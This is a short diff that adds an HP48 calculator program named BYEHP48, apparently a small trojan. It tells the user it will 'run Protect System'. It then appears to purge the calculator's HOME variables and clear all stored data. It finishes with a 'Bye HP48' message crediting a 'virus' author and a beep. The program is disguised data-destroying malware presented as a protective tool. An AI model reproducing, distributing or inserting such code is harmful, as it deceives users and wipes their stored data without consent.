@@ -1,0 +1,13 @@
+<< CLLCD
+   "Press any key to run Protect System" MSGBOX
+   << DO
+      HOME CLEAR VARS OBJ-> DROP
+      'V1' STO
+      PURGE 'V1'
+      UNTIL DEPTH 0
+      END
+   >> CLVAR CLEAR
+   CLLCD
+   "Bye HP48..... virus_br@hotmail.com Higuita(3c)" MSGBOX
+   1400 .60 BEEP
+>> 'BYEHP48' [STO]
